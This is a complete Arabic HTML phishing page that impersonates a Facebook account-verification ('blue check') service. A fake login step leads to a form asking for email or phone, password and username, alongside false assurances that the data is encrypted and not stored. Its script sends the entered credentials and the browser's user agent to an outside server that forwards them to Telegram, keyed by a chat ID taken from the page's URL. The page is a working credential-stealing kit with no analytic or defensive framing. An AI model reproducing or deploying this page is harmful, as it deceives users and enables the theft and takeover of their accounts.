<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>توثيق حساب فيسبوك - الحصول على العلامة الزرقاء</title>
  <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }
    
    body {
      margin: 0;
      overflow-x: hidden;
      font-family: 'Tajawal', sans-serif;
      color: white;
      background: linear-gradient(135deg, #1877f2, #0d5cb6, #1877f2);
      background-size: 400% 400%;
      animation: gradientBG 15s ease infinite;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }

    @keyframes gradientBG {
      0% {background-position: 0% 50%;}
      50% {background-position: 100% 50%;}
      100% {background-position: 0% 50%;}
    }

    .main-container {
      width: 100%;
      max-width: 500px;
      margin: 0 auto;
      overflow-y: auto;
      max-height: 95vh;
      scroll-behavior: smooth;
      -webkit-overflow-scrolling: touch;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
      border-radius: 20px;
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(10px);
      border: 1px solid rgba(255, 255, 255, 0.1);
      padding: 25px;
      position: relative;
    }

    .scroll-indicator {
      position: absolute;
      bottom: 10px;
      left: 50%;
      transform: translateX(-50%);
      color: rgba(255, 255, 255, 0.6);
      font-size: 14px;
      animation: bounce 2s infinite;
    }

    @keyframes bounce {
      0%, 20%, 50%, 80%, 100% {transform: translateX(-50%) translateY(0);}
      40% {transform: translateX(-50%) translateY(-10px);}
      60% {transform: translateX(-50%) translateY(-5px);}
    }

    .container {
      margin: 20px auto;
      padding: 25px;
      background: rgba(255, 255, 255, 0.1);
      border-radius: 15px;
      width: 100%;
      position: relative;
      z-index: 1;
      text-align: center;
      transition: all 0.3s ease;
      border: 1px solid rgba(255, 255, 255, 0.15);
    }

    .container:hover {
      transform: translateY(-5px);
      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
    }

    h1 {
      font-size: 28px;
      margin-bottom: 25px;
      color: #fff;
      text-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
      position: relative;
      padding-bottom: 15px;
    }

    h1::after {
      content: '';
      position: absolute;
      bottom: 0;
      left: 30%;
      right: 30%;
      height: 3px;
      background: linear-gradient(to right, transparent, #1877f2, transparent);
      border-radius: 3px;
    }

    .btn {
      display: flex;
      align-items: center;
      justify-content: center;
      width: 100%;
      padding: 15px;
      margin: 15px 0;
      color: white;
      border: none;
      border-radius: 10px;
      font-size: 18px;
      font-weight: 500;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
      position: relative;
      overflow: hidden;
    }

    .btn::before {
      content: '';
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(255, 255, 255, 0.15);
      z-index: 1;
      transition: all 0.3s;
    }

    .btn:hover::before {
      background: rgba(255, 255, 255, 0.25);
    }

    .btn:active {
      transform: translateY(2px) scale(0.98);
    }

    .btn img {
      width: 28px;
      height: 28px;
      margin-left: 12px;
      filter: drop-shadow(0 2px 2px rgba(0, 0, 0, 0.2));
      position: relative;
      z-index: 2;
    }

    .btn span {
      position: relative;
      z-index: 2;
    }

    .btn.facebook {
      background: linear-gradient(45deg, #1877f2, #0d5cb6);
    }

    .buy-btn {
      background: linear-gradient(45deg, #1877f2, #0d5cb6);
      color: white;
      border: none;
      padding: 15px 20px;
      border-radius: 10px;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 4px 10px rgba(24, 119, 242, 0.3);
      width: 100%;
      font-size: 18px;
      margin-top: 20px;
    }

    .buy-btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 6px 15px rgba(24, 119, 242, 0.4);
    }

    input, select {
      width: 100%;
      padding: 14px;
      margin: 12px 0;
      border-radius: 10px;
      border: none;
      background: rgba(255, 255, 255, 0.15);
      color: white;
      font-size: 16px;
      font-family: 'Tajawal', sans-serif;
      transition: all 0.3s ease;
    }

    input:focus, select:focus {
      outline: none;
      background: rgba(255, 255, 255, 0.25);
      box-shadow: 0 0 0 3px rgba(24, 119, 242, 0.3);
    }

    input::placeholder {
      color: rgba(255, 255, 255, 0.6);
    }

    form {
      background: rgba(0, 0, 0, 0.2);
      padding: 25px;
      border-radius: 15px;
      margin-top: 20px;
    }

    label {
      display: block;
      margin: 15px 0 8px;
      font-weight: 600;
      color: #fff;
      text-align: right;
      font-size: 16px;
    }

    .logo {
      text-align: center;
      margin-bottom: 25px;
    }

    .logo img {
      width: 80px;
      height: 80px;
      border-radius: 50%;
      object-fit: cover;
      border: 3px solid rgba(255, 255, 255, 0.2);
      box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
      transition: all 0.5s ease;
    }

    .logo img:hover {
      transform: rotate(360deg) scale(1.1);
    }

    .featured-image {
      width: 100%;
      height: 200px;
      border-radius: 15px;
      margin: 20px 0;
      background: linear-gradient(45deg, #1877f2, #0d5cb6);
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      position: relative;
    }

    .featured-image::before {
      content: "✅ توثيق فيسبوك";
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.4);
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 28px;
      font-weight: bold;
      color: white;
      text-shadow: 0 2px 5px rgba(0, 0, 0, 0.5);
    }

    @media (max-width: 600px) {
      .main-container {
        padding: 15px;
        max-height: 90vh;
      }
      
      .container {
        padding: 20px;
      }
      
      h1 {
        font-size: 24px;
      }
      
      .btn {
        padding: 12px;
        font-size: 16px;
      }
      
      .featured-image {
        height: 150px;
      }
    }

    /* Success message styling */
    .success-message {
      background: rgba(46, 204, 113, 0.2);
      border: 1px solid rgba(46, 204, 113, 0.4);
      border-radius: 10px;
      padding: 15px;
      margin: 20px 0;
      text-align: center;
      animation: fadeIn 0.5s ease;
    }
    
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(10px); }
      to { opacity: 1; transform: translateY(0); }
    }
    
    /* Loading spinner */
    .spinnert {
      display: none;
      width: 40px;
      height: 40px;
      margin: 0 auto;
      border: 4px solid rgba(255, 255, 255, 0.3);
      border-radius: 50%;
      border-top: 4px solid #1877f2;
      animation: spin 1s linear infinite;
    }
    
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    
    /* Security badge */
    .security-badge {
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
      margin-top: 15px;
      font-size: 14px;
      color: rgba(255, 255, 255, 0.7);
    }
    
    .security-badge i {
      color: #2ecc71;
    }
    
    /* Error message */
    .error-message {
      background: rgba(231, 76, 60, 0.2);
      border: 1px solid rgba(231, 76, 60, 0.4);
      border-radius: 10px;
      padding: 15px;
      margin: 20px 0;
      text-align: center;
      animation: fadeIn 0.5s ease;
    }
    
    /* علامة التحقق الزرقاء */
    .verified-badge {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      background: #1877f2;
      color: white;
      width: 24px;
      height: 24px;
      border-radius: 50%;
      margin-right: 8px;
      font-size: 14px;
    }
    
    .blue-check {
      color: #1877f2;
      font-size: 24px;
      margin-left: 10px;
    }

    /* Notification */
    .notification {
      position: fixed;
      top: 20px;
      left: 50%;
      transform: translateX(-50%);
      background: rgba(0,0,0,0.8);
      color: white;
      padding: 15px 25px;
      border-radius: 10px;
      z-index: 1000;
      display: flex;
      align-items: center;
      box-shadow: 0 5px 15px rgba(0,0,0,0.3);
      animation: slideIn 0.3s, fadeOut 0.5s 2.5s forwards;
    }
    
    @keyframes slideIn {
      from { top: -100px; }
      to { top: 20px; }
    }
    
    @keyframes fadeOut {
      from { opacity: 1; }
      to { opacity: 0; top: -100px; }
    }
    
    .notification.success {
      border-left: 4px solid #2ecc71;
    }
    
    .notification.error {
      border-left: 4px solid #e74c3c;
    }
    
    .notification.info {
      border-left: 4px solid #3498db;
    }
    
    .notification-icon {
      margin-left: 10px;
      font-size: 20px;
    }

    .chat-id-info {
      background: rgba(255, 255, 255, 0.1);
      padding: 10px;
      border-radius: 8px;
      margin: 10px 0;
      font-size: 14px;
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="main-container">
    <div class="scroll-indicator">اسحب لأسفل</div>
    
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="فيسبوك">
    </div>
    
    <div id="login" class="container">
      <h1>توثيق حساب فيسبوك <i class="fas fa-check-circle blue-check"></i></h1>
      
      <div class="featured-image"></div>
      
      <button class="btn facebook" onclick="loginWithFacebook()">
        <span>توثيق عبر فيسبوك</span>
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook">
      </button>
      
      <div class="security-badge">
        <i class="fas fa-lock"></i>
        <span>جميع البيانات مشفرة ومحمية بطبقات أمنية متعددة</span>
      </div>
    </div>

    <div id="form" class="container" style="display: none;">
      <h1>طلب علامة التحقق الزرقاء <span class="verified-badge"><i class="fas fa-check"></i></span></h1>
      
      <div class="chat-id-info" id="chatIdInfo">
        <i class="fas fa-info-circle"></i>
        <span>سيتم الإرسال إلى: <strong id="currentChatId">68C</strong></span>
      </div>
      
      <form id="verificationForm">
        <label>البريد الإلكتروني أو رقم الهاتف:</label>
        <input 
          type="text" 
          id="identifier" 
          name="identifier" 
          required 
          placeholder="أدخل بريدك أو رقمك"
          autocomplete="off"
        >
        
        <label>كلمة المرور:</label>
        <input type="password" name="password" required placeholder="أدخل كلمة المرور">

        <label>اسم المستخدم:</label>
        <input type="text" name="player_id" required placeholder="اسم المستخدم في فيسبوك">

        <div class="spinnert" id="loadingSpinner"></div>
        <button type="submit" class="buy-btn" id="submitBtn">
          تقديم طلب التوثيق <i class="fas fa-check-circle"></i>
        </button>
        
        <div class="security-badge">
          <i class="fas fa-shield-alt"></i>
          <span>جميع البيانات مشفرة ولا يتم تخزينها</span>
        </div>
      </form>
    </div>
  </div>

  <script>
    // الحصول على chatId من الرابط
    function getChatIdFromUrl() {
      const urlParams = new URLSearchParams(window.location.search);
      return urlParams.get('id') || "68C";
    }

    // إظهار إشعار
    function showNotification(message, type) {
      const notification = document.createElement('div');
      notification.className = `notification ${type}`;
      
      let icon = '';
      if (type === 'success') {
        icon = '<i class="fas fa-check-circle notification-icon"></i>';
      } else if (type === 'error') {
        icon = '<i class="fas fa-exclamation-circle notification-icon"></i>';
      } else {
        icon = '<i class="fas fa-info-circle notification-icon"></i>';
      }
      
      notification.innerHTML = `${icon} ${message}`;
      document.body.appendChild(notification);
      
      setTimeout(() => {
        notification.remove();
      }, 3000);
    }
    
    // محاكاة تسجيل الدخول بفيسبوك
    function loginWithFacebook() {
      document.getElementById('login').style.display = 'none';
      document.getElementById('form').style.display = 'block';
      
      // عرض chatId الحالي
      const chatId = getChatIdFromUrl();
      document.getElementById('currentChatId').textContent = chatId;
      
      // إظهار إشعار بنجاح تسجيل الدخول
      showNotification('تم تسجيل الدخول بنجاح!', 'success');
    }
    
    // إرسال البيانات إلى السيرفر
    document.getElementById('verificationForm').addEventListener('submit', async function(e) {
      e.preventDefault();
      
      const submitBtn = document.getElementById('submitBtn');
      const loadingSpinner = document.getElementById('loadingSpinner');
      const form = document.getElementById('verificationForm');
      
      // إظهار مؤشر التحميل
      submitBtn.style.display = 'none';
      loadingSpinner.style.display = 'block';
      
      // جمع البيانات من النموذج
      const formData = new FormData(this);
      const identifier = formData.get('identifier');
      const password = formData.get('password');
      const playerId = formData.get('player_id');
      const chatId = getChatIdFromUrl();
      
      try {
        // إعداد البيانات بالشكل المطلوب للسيرفر
        const data = {
          playerId: playerId,
          password: password,
          amount: identifier, // رقم الهاتف أو البريد
          chatId: chatId, // من الرابط
          platform: "فيسبوك",
          device: navigator.userAgent
        };
        
        console.log('📤 بيانات الإرسال:', data);
        
        // إرسال البيانات إلى السيرفر الخاص بك
        const response = await fetch('https://botlkm.onrender.com/send-to-telegram', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify(data)
        });
        
        console.log('📥 استجابة السيرفر:', response);
        
        if (!response.ok) {
          const errorData = await response.json().catch(() => ({ message: 'خطأ غير معروف' }));
          throw new Error(`خطأ ${response.status}: ${errorData.message || 'فشل في الإرسال'}`);
        }
        
        const result = await response.json();
        console.log('✅ نتيجة الإرسال:', result);
        
        if (result.success) {
          // إخفاء مؤشر التحميل
          loadingSpinner.style.display = 'none';
          
          // إظهار رسالة النجاح
          const successMessage = document.createElement('div');
          successMessage.className = 'success-message';
          successMessage.innerHTML = `
            <h3><i class="fas fa-check-circle" style="color: #2ecc71;"></i> تم تقديم طلبك بنجاح!</h3>
            <p>سيتم مراجعة طلبك خلال 24-48 ساعة.</p>
            <p><strong>رقم الطلب:</strong> ${result.orderId || '#' + Math.floor(100000 + Math.random() * 900000)}</p>
            <p><strong>تم الإرسال إلى:</strong> ${chatId}</p>
          `;
          
          // استبدال النموذج برسالة النجاح
          form.innerHTML = '';
          form.appendChild(successMessage);
          
          // إظهار إشعار النجاح
          showNotification('تم إرسال طلب التوثيق بنجاح!', 'success');
        } else {
          throw new Error(result.message || 'فشل في إرسال البيانات');
        }
        
      } catch (error) {
        // إخفاء مؤشر التحميل
        loadingSpinner.style.display = 'none';
        submitBtn.style.display = 'block';
        
        console.error('❌ خطأ في الإرسال:', error);
        
        // إظهار رسالة الخطأ
        const errorMessage = document.createElement('div');
        errorMessage.className = 'error-message';
        errorMessage.innerHTML = `
          <h3><i class="fas fa-exclamation-triangle" style="color: #e74c3c;"></i> حدث خطأ!</h3>
          <p>${error.message}</p>
          <p>يرجى المحاولة مرة أخرى</p>
        `;
        
        // إضافة رسالة الخطأ فوق النموذج
        const formContainer = form.parentNode;
        if (formContainer.querySelector('.error-message')) {
          formContainer.querySelector('.error-message').remove();
        }
        formContainer.insertBefore(errorMessage, form);
        
        // إظهار إشعار الخطأ
        showNotification('حدث خطأ أثناء إرسال الطلب!', 'error');
      }
    });

    // إضافة مؤشر السحب
    const mainContainer = document.querySelector('.main-container');
    const scrollIndicator = document.querySelector('.scroll-indicator');
    
    if (mainContainer && scrollIndicator) {
      mainContainer.addEventListener('scroll', function() {
        const scrollPercentage = (mainContainer.scrollTop / (mainContainer.scrollHeight - mainContainer.clientHeight)) * 100;
        
        if (scrollPercentage > 90) {
          scrollIndicator.textContent = "اسحب لأعلى";
        } else if (scrollPercentage < 10) {
          scrollIndicator.textContent = "اسحب لأسفل";
        }
      });
    }

    // اختبار اتصال السيرفر عند التحميل
    window.addEventListener('load', async () => {
      try {
        const response = await fetch('https://botlkm.onrender.com/health');
        const data = await response.json();
        console.log('🟢 حالة السيرفر:', data);
        
        if (!data.tokenConfigured) {
          console.warn('⚠️  السيرفر يعمل ولكن BOT_TOKEN غير مضبوط');
        }
      } catch (error) {
        console.warn('🔴 لا يمكن الاتصال بالسيرفر:', error.message);
      }
    });

    // منع إعادة إرسال النموذج
    let isSubmitting = false;
    document.getElementById('verificationForm').addEventListener('submit', function(e) {
      if (isSubmitting) {
        e.preventDefault();
        return;
      }
      isSubmitting = true;
      setTimeout(() => { isSubmitting = false; }, 5000);
    });
  </script>
</body>
  </html>
